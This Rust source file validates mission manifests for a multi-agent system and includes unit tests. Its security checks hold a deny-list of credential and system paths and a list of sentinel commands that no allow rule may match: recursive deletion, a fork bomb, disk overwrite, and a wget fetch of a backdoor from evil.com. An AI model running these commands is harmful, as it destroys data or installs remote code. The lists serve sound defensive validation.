//! Parse and validate a mission manifest YAML (schema v1).
//!
//! Reference: docs/architect/M7-15-mission-manifest/ARCHITECT_PLAN.md §1

use anyhow::{bail, Context, Result};
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::Path;

use crate::delegate::MAX_TTL_HOURS;
use crate::selector::DEFAULT_MISSION_TTL_HOURS;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MissionManifest {
    pub version: u8,
    pub mission_id: String,
    pub description: String,
    pub author: String,
    #[serde(default)]
    pub pattern: Option<String>,
    #[serde(default = "default_ttl_hours")]
    pub mission_ttl_hours: i64,
    #[serde(default)]
    pub agents: Vec<ManifestAgent>,
    #[serde(default)]
    pub scope: ManifestScope,
    #[serde(default)]
    pub mission_gate: MissionGate,
    #[serde(default = "default_auditor_pool")]
    pub auditor_pool: Vec<String>,
    #[serde(default)]
    pub inter_agent_protocol: InterAgentProtocol,
    #[serde(default)]
    pub budget: MissionBudget,
    #[serde(default)]
    pub acceptance_criteria: Vec<String>,
    #[serde(default)]
    pub metadata: HashMap<String, String>,
    #[serde(default)]
    pub tags: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Default)]
#[serde(rename_all = "snake_case")]
pub enum MissionGate {
    #[default]
    Enforce,
    Observe,
    Off,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Default)]
#[serde(rename_all = "snake_case")]
pub enum InterAgentProtocol {
    #[default]
    Terse,
    Verbose,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ManifestAgent {
    pub role: String,
    #[serde(default = "default_count")]
    pub count: u8,
    #[serde(default)]
    pub instances: Vec<String>,
    #[serde(default)]
    pub task: String,
    #[serde(default)]
    pub scope: Option<ManifestScope>,
    #[serde(default)]
    pub model: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ManifestScope {
    #[serde(default)]
    pub paths: Vec<String>,
    #[serde(default)]
    pub path_not_match: Vec<String>,
    #[serde(default)]
    pub bash_patterns: ManifestBashPatterns,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ManifestBashPatterns {
    #[serde(default)]
    pub extra_allow: Vec<String>,
    #[serde(default)]
    pub extra_deny: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MissionBudget {
    #[serde(default = "default_max_hours")]
    pub max_hours: u8,
    #[serde(default = "default_max_agents")]
    pub max_agents: u8,
}

impl Default for MissionBudget {
    fn default() -> Self {
        Self {
            max_hours: 8,
            max_agents: 12,
        }
    }
}

fn default_ttl_hours() -> i64 {
    DEFAULT_MISSION_TTL_HOURS
}
fn default_count() -> u8 {
    1
}
fn default_auditor_pool() -> Vec<String> {
    vec!["auditor".to_string()]
}
fn default_max_hours() -> u8 {
    8
}
fn default_max_agents() -> u8 {
    12
}

#[derive(Debug, Clone)]
pub struct ManifestError {
    pub line: usize,
    pub col: usize,
    pub message: String,
    pub suggestion: Option<String>,
    pub fix_command: Option<String>,
}

impl std::fmt::Display for ManifestError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "ERROR line {}:{}: {}", self.line, self.col, self.message)?;
        if let Some(ref s) = self.suggestion {
            write!(f, "\n      Suggestion: {}", s)?;
        }
        if let Some(ref cmd) = self.fix_command {
            write!(f, "\n      Run: {}", cmd)?;
        }
        Ok(())
    }
}

#[derive(Debug, Clone)]
pub struct AgentInstanceDescriptor {
    pub role_id: String,
    pub agent_id: String,
    pub instance_suffix: Option<String>,
    pub task: String,
    pub scope: ManifestScope,
    pub model: Option<String>,
}

pub fn build_agent_id(mission_id: &str, role_id: &str, suffix: Option<&str>) -> String {
    match suffix {
        None => role_id.to_string(),
        Some(s) => format!("{mission_id}__{role_id}-{s}"),
    }
}

pub fn role_for_agent_id(agent_id: &str) -> &str {
    if let Some(pos) = agent_id.find("__") {
        let rest = &agent_id[pos + 2..];
        if let Some(dash) = rest.rfind('-') {
            let suffix = &rest[dash + 1..];
            if suffix.len() <= 20 && !suffix.contains('_') {
                return &rest[..dash];
            }
        }
        rest
    } else {
        agent_id
    }
}

// ── Security invariants (hardcoded, §2 ARCHITECT_PLAN) ──────────────────────

/// Paths that can never be reached by manifest scope (§2.2).
const HARD_BLOCKED_PATH_PREFIXES: &[&str] = &[
    "/etc", "/root", "/var/log", "/proc", "/sys", "/boot", "/dev",
];

/// Suffixes matched against path components (§2.2).
const HARD_BLOCKED_PATH_SUFFIXES: &[&str] = &[
    ".ssh",
    ".aws",
    ".config/gcloud",
    ".config/op",
    ".gnupg",
    ".kube",
];

/// Sentinel strings no extra_allow regex must match (§2.4).
const BASH_SENTINELS: &[&str] = &[
    "rm -rf /",
    "dd if=/dev/",
    "mkfs.",
    ":(){ :|:& };:",
    "wget https://evil.com/backdoor.sh -O /tmp/backdoor.sh",
    "chmod 777 /",
    "chmod -R 777",
    "chown -R root",
];

/// Forbidden top-level keys that MUST NOT appear in manifest YAML (§2.5).
const FORBIDDEN_MANIFEST_KEYS: &[&str] = &[
    "role_type",
    "default_trust_level",
    "disable_audit_log",
    "disable_blocked_tier",
    "bypass_session_gate",
];

// ── Validation helpers ────────────────────────────────────────────────────────

/// Validate scope paths against hardcoded blocklist (§2.2).
fn validate_scope_paths(paths: &[String]) -> Result<()> {
    for (i, p) in paths.iter().enumerate() {
        if !p.starts_with('/') {
            bail!(
                "manifest.scope.paths[{}] '{}' must be absolute (start with /)",
                i,
                p
            );
        }
        if p.contains("..") {
            bail!(
                "manifest.scope.paths[{}] '{}' contains '..' — rejected",
                i,
                p
            );
        }
        for blocked in HARD_BLOCKED_PATH_PREFIXES {
            if p.starts_with(blocked)
                && (p.len() == blocked.len() || p.as_bytes()[blocked.len()] == b'/')
            {
                bail!(
                    "manifest.scope.paths[{}] '{}' is in hard-blocked prefix '{}'",
                    i,
                    p,
                    blocked
                );
            }
        }
        for blocked in HARD_BLOCKED_PATH_SUFFIXES {
            if p.ends_with(blocked) {
                let prefix_len = p.len() - blocked.len();
                if prefix_len == 0 || p.as_bytes()[prefix_len - 1] == b'/' {
                    bail!(
                        "manifest.scope.paths[{}] '{}' ends with blocked suffix '{}'",
                        i,
                        p,
                        blocked
                    );
                }
            }
        }
    }
    Ok(())
}

/// Validate each extra_allow regex against security rules (§2.7).
fn validate_extra_allow_regexes(patterns: &[String]) -> Result<()> {
    for (i, raw) in patterns.iter().enumerate() {
        if !raw.starts_with('^') {
            bail!(
                "manifest.scope.bash_patterns.extra_allow[{}] '{}' must start with '^'",
                i,
                raw
            );
        }
        // Catch-all detection
        let stripped = raw.trim_start_matches('^').trim_end_matches('$');
        if stripped == ".*" || stripped == ".+" || stripped.is_empty() {
            bail!(
                "manifest.scope.bash_patterns.extra_allow[{}] '{}' is a catch-all pattern — rejected",
                i, raw
            );
        }
        // Compile
        let re = Regex::new(raw).with_context(|| {
            format!(
                "manifest.scope.bash_patterns.extra_allow[{}] '{}' is not a valid regex",
                i, raw
            )
        })?;
        // Must NOT match any sentinel
        for sentinel in BASH_SENTINELS {
            if re.is_match(sentinel) {
                bail!(
                    "manifest.scope.bash_patterns.extra_allow[{}] '{}' matches sentinel '{}' — rejected",
                    i, raw, sentinel
                );
            }
        }
        // Chain-greedy detection: test if regex matches its own prefix + chain op
        let prefix = raw.trim_start_matches('^').trim_end_matches('$');
        if !prefix.is_empty() && !prefix.starts_with('\\') {
            let test_input = format!("{} && echo pwned", prefix);
            if re.is_match(&test_input) {
                bail!(
                    "manifest.scope.bash_patterns.extra_allow[{}] '{}' is overly broad — \
                     chain operators (&&, ||, ;, |) can bypass it. \
                     Add bounds like [^&;|`$()]* after the host/path.",
                    i,
                    raw
                );
            }
        }
    }
    Ok(())
}

impl MissionManifest {
    pub fn from_yaml(yaml: &str) -> Result<Self> {
        // Check for forbidden top-level keys (§2.5)
        let raw: serde_yml::Value =
            serde_yml::from_str(yaml).context("failed to parse mission manifest YAML")?;
        if let Some(mapping) = raw.as_mapping() {
            for key in FORBIDDEN_MANIFEST_KEYS {
                if mapping.contains_key(serde_yml::Value::String(key.to_string())) {
                    bail!(
                        "manifest contains forbidden field '{}' — this field is never honored",
                        key
                    );
                }
            }
        }
        let manifest: MissionManifest =
            serde_yml::from_str(yaml).context("failed to parse mission manifest YAML")?;
        manifest.validate()?;
        Ok(manifest)
    }

    pub fn from_path(path: &Path) -> Result<Self> {
        let content = std::fs::read_to_string(path)
            .with_context(|| format!("failed to read manifest {}", path.display()))?;
        Self::from_yaml(&content)
    }

    pub fn validate(&self) -> Result<()> {
        if self.version != 1 {
            bail!("manifest.version must be 1 (got {})", self.version);
        }
        if self.mission_id.trim().is_empty() {
            bail!("manifest.mission_id cannot be empty");
        }
        if !self
            .mission_id
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-')
        {
            bail!(
                "manifest.mission_id must be ASCII alphanumeric + hyphens (got '{}')",
                self.mission_id
            );
        }
        if self.description.trim().is_empty() {
            bail!("manifest.description cannot be empty");
        }
        if self.description.len() > 512 {
            bail!(
                "manifest.description exceeds 512 chars (got {})",
                self.description.len()
            );
        }
        if self.author.trim().is_empty() {
            bail!("manifest.author cannot be empty");
        }
        if self.mission_ttl_hours <= 0 {
            bail!(
                "manifest.mission_ttl_hours must be > 0 (got {})",
                self.mission_ttl_hours
            );
        }
        if self.mission_ttl_hours > MAX_TTL_HOURS {
            bail!(
                "manifest.mission_ttl_hours exceeds MAX_TTL_HOURS ({} > {})",
                self.mission_ttl_hours,
                MAX_TTL_HOURS
            );
        }
        if self.agents.is_empty() {
            bail!("manifest.agents cannot be empty");
        }
        if self.budget.max_hours > 24 {
            bail!(
                "manifest.budget.max_hours exceeds 24 (got {})",
                self.budget.max_hours
            );
        }
        if self.budget.max_agents > 25 {
            bail!(
                "manifest.budget.max_agents exceeds 25 (got {})",
                self.budget.max_agents
            );
        }
        if self.acceptance_criteria.len() > 10 {
            bail!(
                "manifest.acceptance_criteria exceeds 10 items (got {})",
                self.acceptance_criteria.len()
            );
        }
        for (i, ac) in self.acceptance_criteria.iter().enumerate() {
            if ac.len() > 200 {
                bail!(
                    "manifest.acceptance_criteria[{}] exceeds 200 chars (got {})",
                    i,
                    ac.len()
                );
            }
        }
        if self.scope.paths.len() > 32 {
            bail!(
                "manifest.scope.paths exceeds 32 entries (got {})",
                self.scope.paths.len()
            );
        }
        for (i, p) in self.scope.paths.iter().enumerate() {
            if p.len() > 256 {
                bail!(
                    "manifest.scope.paths[{}] exceeds 256 chars (got {})",
                    i,
                    p.len()
                );
            }
        }
        if self.scope.bash_patterns.extra_allow.len() > 20 {
            bail!(
                "manifest.scope.bash_patterns.extra_allow exceeds 20 regexes (got {})",
                self.scope.bash_patterns.extra_allow.len()
            );
        }
        for (i, p) in self.scope.bash_patterns.extra_allow.iter().enumerate() {
            if p.len() > 256 {
                bail!(
                    "manifest.scope.bash_patterns.extra_allow[{}] exceeds 256 chars (got {})",
                    i,
                    p.len()
                );
            }
        }
        if self.scope.bash_patterns.extra_deny.len() > 50 {
            bail!(
                "manifest.scope.bash_patterns.extra_deny exceeds 50 regexes (got {})",
                self.scope.bash_patterns.extra_deny.len()
            );
        }
        // per-agent
        let mut total_agents: u32 = 0;
        let mut auditor_count: u32 = 0;
        for (i, agent) in self.agents.iter().enumerate() {
            if agent.role.trim().is_empty() {
                bail!("manifest.agents[{}].role cannot be empty", i);
            }
            if agent.count == 0 {
                bail!("manifest.agents[{}].count must be >= 1 (got 0)", i);
            }
            if agent.count > 5 {
                bail!(
                    "manifest.agents[{}].count exceeds 5 (got {})",
                    i,
                    agent.count
                );
            }
            if agent.count > 1 && agent.instances.len() != agent.count as usize {
                bail!(
                    "manifest.agents[{}]: count={} but instances has {} entries (must match)",
                    i,
                    agent.count,
                    agent.instances.len()
                );
            }
            total_agents += agent.count as u32;
            if agent.role == "auditor" {
                auditor_count += agent.count as u32;
            }
        }
        if total_agents > self.budget.max_agents as u32 {
            bail!(
                "manifest total agents {} exceeds budget.max_agents {}",
                total_agents,
                self.budget.max_agents
            );
        }
        if total_agents > 25 {
            bail!("manifest total agents {} exceeds hard cap 25", total_agents);
        }
        if auditor_count > 1 {
            bail!(
                "manifest has {} auditor instances — only 1 auditor allowed",
                auditor_count
            );
        }
        // Security invariants (§2)
        validate_scope_paths(&self.scope.paths)?;
        if !self.scope.bash_patterns.extra_allow.is_empty() {
            validate_extra_allow_regexes(&self.scope.bash_patterns.extra_allow)?;
        }
        Ok(())
    }
}

// ── Legacy backwards-compat aliases (used by selector.rs and CLI) ────────────

/// Backward-compat alias. Will be removed after M7.15 migration.
pub type ManifestRole = ManifestAgent;

/// Backward-compat: provide a `role()` method that searches agents by `role` field.
impl MissionManifest {
    /// Find an agent by its role id. Legacy name — maps to searching `self.agents`.
    pub fn role(&self, name: &str) -> Option<&ManifestAgent> {
        self.agents.iter().find(|a| a.role == name)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn valid_manifest_yaml() -> String {
        r#"version: 1
mission_id: test-001
description: "Test mission for validation"
author: coco
agents:
  - role: developer
  - role: auditor
"#
        .to_string()
    }

    #[test]
    fn test_valid_manifest() {
        let m = MissionManifest::from_yaml(&valid_manifest_yaml()).unwrap();
        assert_eq!(m.version, 1);
        assert_eq!(m.mission_id, "test-001");
        assert_eq!(m.agents.len(), 2);
    }

    #[test]
    fn test_rejects_version_not_1() {
        let yaml = valid_manifest_yaml().replace("version: 1", "version: 2");
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(err.contains("version must be 1"));
    }

    #[test]
    fn test_rejects_empty_mission_id() {
        let yaml = valid_manifest_yaml().replace("test-001", "");
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(err.contains("mission_id"));
    }

    #[test]
    fn test_rejects_non_ascii_mission_id() {
        let yaml = valid_manifest_yaml().replace("test-001", "misión_especial");
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(err.contains("ASCII"));
    }

    #[test]
    fn test_rejects_empty_description() {
        let yaml = valid_manifest_yaml().replace(
            "description: \"Test mission for validation\"",
            "description: \"\"",
        );
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(err.contains("description"));
    }

    #[test]
    fn test_rejects_description_over_512() {
        let long_desc = "a".repeat(513);
        let yaml = valid_manifest_yaml().replace(
            "description: \"Test mission for validation\"",
            &format!("description: \"{}\"", long_desc),
        );
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(err.contains("512"));
    }

    #[test]
    fn test_rejects_empty_author() {
        let yaml = valid_manifest_yaml().replace("author: coco", "author: \"\"");
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(err.contains("author"));
    }

    #[test]
    fn test_rejects_ttl_over_max() {
        let yaml = valid_manifest_yaml().replace(
            "author: coco",
            &format!("author: coco\nmission_ttl_hours: {}", MAX_TTL_HOURS + 1),
        );
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(err.contains("MAX_TTL_HOURS"));
    }

    #[test]
    fn test_rejects_empty_agents() {
        let yaml = valid_manifest_yaml().replace(
            "agents:\n  - role: developer\n  - role: auditor",
            "agents: []",
        );
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(err.contains("agents cannot be empty"));
    }

    #[test]
    fn test_rejects_count_exceeds_5() {
        let yaml =
            valid_manifest_yaml().replace("role: developer", "role: developer\n    count: 6");
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(err.contains("count exceeds 5"));
    }

    #[test]
    fn test_rejects_count_mismatch_instances() {
        let yaml = valid_manifest_yaml().replace(
            "role: developer",
            "role: developer\n    count: 2\n    instances: [only-one]",
        );
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(err.contains("instances has"));
    }

    #[test]
    fn test_rejects_multiple_auditors() {
        let yaml = valid_manifest_yaml().replace(
            "agents:\n  - role: developer\n  - role: auditor",
            "agents:\n  - role: auditor\n  - role: auditor",
        );
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(err.contains("only 1 auditor"));
    }

    #[test]
    fn test_rejects_total_agents_over_25() {
        let mut roles = String::from("agents:");
        for i in 0..26 {
            roles.push_str(&format!("\n  - role: dev{}", i));
        }
        let yaml = valid_manifest_yaml()
            .replace("agents:\n  - role: developer\n  - role: auditor", &roles)
            + "\nbudget:\n  max_agents: 30\n"; // raise budget so it doesn't fire first
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(
            err.contains("25"),
            "Expected hard cap 25 error, got: {}",
            err
        );
    }

    #[test]
    fn test_rejects_relative_path() {
        let yaml = valid_manifest_yaml() + "\nscope:\n  paths:\n    - relative/path\n";
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(err.contains("absolute"));
    }

    #[test]
    fn test_rejects_path_with_dotdot() {
        let yaml = valid_manifest_yaml() + "\nscope:\n  paths:\n    - /home/coco/../etc\n";
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(err.contains(".."));
    }

    #[test]
    fn test_rejects_blocked_path_prefix() {
        let yaml = valid_manifest_yaml() + "\nscope:\n  paths:\n    - /etc/secret\n";
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(err.contains("blocked"));
    }

    #[test]
    fn test_rejects_ssh_suffix() {
        let yaml = valid_manifest_yaml() + "\nscope:\n  paths:\n    - /home/coco/.ssh\n";
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(err.contains("blocked"));
    }

    #[test]
    fn test_rejects_catch_all_regex() {
        let yaml =
            valid_manifest_yaml() + "\nscope:\n  bash_patterns:\n    extra_allow:\n      - ^.*$\n";
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(err.contains("catch-all"));
    }

    #[test]
    fn test_rejects_regex_without_anchor() {
        let yaml = valid_manifest_yaml()
            + "\nscope:\n  bash_patterns:\n    extra_allow:\n      - curl.*coinbase\n";
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(err.contains("start with '^'"));
    }

    #[test]
    fn test_rejects_regex_matching_sentinel() {
        let yaml = valid_manifest_yaml()
            + "\nscope:\n  bash_patterns:\n    extra_allow:\n      - '^rm .*'\n";
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(err.contains("sentinel"));
    }

    #[test]
    fn test_rejects_forbidden_field() {
        let yaml = valid_manifest_yaml() + "\nrole_type: auditor\n";
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(err.contains("forbidden field"));
    }

    #[test]
    fn test_valid_with_all_optional_fields() {
        let yaml = r#"version: 1
mission_id: full-test
description: "Full manifest with all optional fields populated"
author: coco
pattern: bbp-impact-chain
mission_ttl_hours: 12
agents:
  - role: bbp_pentester_web
    count: 2
    instances: [squad-a, squad-b]
    task: "Find bugs"
    model: claude-opus-4-7
  - role: auditor
scope:
  paths: [/home/coco/bugbounty]
  path_not_match: ["*.env", "cdp_keys*"]
  bash_patterns:
    extra_allow:
      - '^curl -[a-zA-Z]+ https://[A-Za-z0-9.-]+\.coinbase\.com\b[^&;|`$()]*$'
    extra_deny:
      - '^rm -rf'
mission_gate: enforce
auditor_pool: ["auditor"]
inter_agent_protocol: terse
budget:
  max_hours: 16
  max_agents: 20
acceptance_criteria:
  - "All findings have severity"
  - "PoC reproducible"
metadata:
  target: coinbase-bbp
  ticket: H1-123
tags: [bbp, web]
"#;
        let m = MissionManifest::from_yaml(yaml).unwrap();
        assert_eq!(m.version, 1);
        assert_eq!(m.mission_id, "full-test");
        assert_eq!(m.agents[0].count, 2);
        assert_eq!(m.agents[0].instances, vec!["squad-a", "squad-b"]);
        assert_eq!(m.scope.bash_patterns.extra_allow.len(), 1);
        assert_eq!(m.acceptance_criteria.len(), 2);
        assert!(m.metadata.contains_key("target"));
    }

    #[test]
    fn test_build_agent_id() {
        assert_eq!(build_agent_id("m7-test", "developer", None), "developer");
        assert_eq!(
            build_agent_id("m7-test", "developer", Some("core")),
            "m7-test__developer-core"
        );
    }

    #[test]
    fn test_role_for_agent_id() {
        assert_eq!(role_for_agent_id("developer"), "developer");
        // Strips namespace prefix + instance suffix → pure role_id
        assert_eq!(role_for_agent_id("m7-test__developer-core"), "developer");
        // Realistic Colmena role IDs don't have dashes, so dash always = suffix separator
        assert_eq!(
            role_for_agent_id("m7-15-impl__colmena_developer-cli"),
            "colmena_developer"
        );
    }

    #[test]
    fn test_chain_greedy_regex_rejected() {
        // Use a pattern that is clearly greedy: ^curl.* matches arbitrary commands
        let yaml = valid_manifest_yaml()
            + "\nscope:\n  bash_patterns:\n    extra_allow:\n      - '^curl.*'\n";
        let err = MissionManifest::from_yaml(&yaml).unwrap_err().to_string();
        assert!(
            err.contains("chain") || err.contains("overly broad"),
            "Expected chain-greedy rejection, got: {}",
            err
        );
    }
}
